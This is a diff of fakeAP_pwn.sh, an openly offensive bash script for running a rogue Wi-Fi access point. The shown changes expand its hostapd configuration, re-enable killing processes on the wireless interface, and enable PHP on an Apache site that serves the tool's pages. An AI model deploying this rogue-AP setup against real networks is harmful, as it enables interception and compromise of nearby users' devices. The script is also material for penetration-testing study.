@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh (v0.3-RC49 2010-07-23)                                                         #
+# fakeAP_pwn.sh (v0.3-RC50 2010-07-24)                                                         #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -46,7 +46,7 @@ export          verbose=0                            # 0/1/2      - Verbose mode
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3-RC49"
+export   version="0.3-RC50"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 
 #----Functions---------------------------------------------------------------------------------#
@@ -401,7 +401,7 @@ export pidcheck2=`ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ {print $
 if [ -n "$pidcheck2" ] ; then
    command="kill $pidcheck2"
    if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   #$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing everything on the interface " -e "$command" # to prevent interferenc
+   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing everything on the interface " -e "$command" # to prevent interference
 fi
 if [ "$apType" == "airbase-ng" ] ; then
    command="airmon-ng start $wifiInterface"
@@ -831,20 +831,49 @@ if [ "$debug" == "true" ] ; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
 if [ "$apType" == "hostapd" ] ; then
    if test -e /tmp/fakeAP_pwn.hostapd; then rm /tmp/fakeAP_pwn.hostapd; fi
    echo "# fakeAP_pwn.hostapd v$version
-interface=$wifiInterface
-driver=nl80211
-ssid=\"$ESSID\"
-channel=$fakeAPchannel
-auth_algs=3
-ignore_broadcast_ssid=0
+interface=$apInterface
 logger_syslog=-1
-logger_stdout=-1
 logger_syslog_level=2
+logger_stdout=-1
 logger_stdout_level=2
 dump_file=/tmp/hostapd.dump
 ctrl_interface=/var/run/hostapd
 ctrl_interface_group=0
-macaddr_acl=0" > /tmp/fakeAP_pwn.hostapd
+ssid=\"$ESSID\"
+hw_mode=g
+channel=$fakeAPchannel
+beacon_int=100
+dtim_period=2
+max_num_sta=255
+rts_threshold=2347
+fragm_threshold=2346
+macaddr_acl=0
+auth_algs=3
+ignore_broadcast_ssid=0
+wmm_enabled=1
+wmm_ac_bk_cwmin=4
+wmm_ac_bk_cwmax=10
+wmm_ac_bk_aifs=7
+wmm_ac_bk_txop_limit=0
+wmm_ac_bk_acm=0
+wmm_ac_be_aifs=3
+wmm_ac_be_cwmin=4
+wmm_ac_be_cwmax=10
+wmm_ac_be_txop_limit=0
+wmm_ac_be_acm=0
+wmm_ac_vi_aifs=2
+wmm_ac_vi_cwmin=3
+wmm_ac_vi_cwmax=4
+wmm_ac_vi_txop_limit=94
+wmm_ac_vi_acm=0
+wmm_ac_vo_aifs=2
+wmm_ac_vo_cwmin=2
+wmm_ac_vo_cwmax=3
+wmm_ac_vo_txop_limit=47
+wmm_ac_vo_acm=0
+eapol_key_index_workaround=0
+eap_server=0
+own_ip_addr=127.0.0.1" > /tmp/fakeAP_pwn.hostapd
    if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.hostapd"; fi
    if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.hostapd; fi
 fi
@@ -988,7 +1017,7 @@ if [ "$apMode" != "normal" ] ; then
       mv server.key /etc/ssl/private/ssl-cert-snakeoil.key
       mv server.pem /etc/ssl/certs/ssl-cert-snakeoil.pem
    fi
-   command="/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && /etc/init.d/apache2 reload" #dissable all sites and only enable the fakeAP_pwn one
+   command="/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" #dissable all sites and only enable the fakeAP_pwn one
    if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
    $xterm -geometry 75x10+100+0 -T "fakeAP_pwn v$version - Web Sever" -e "$command" &
    sleep 2
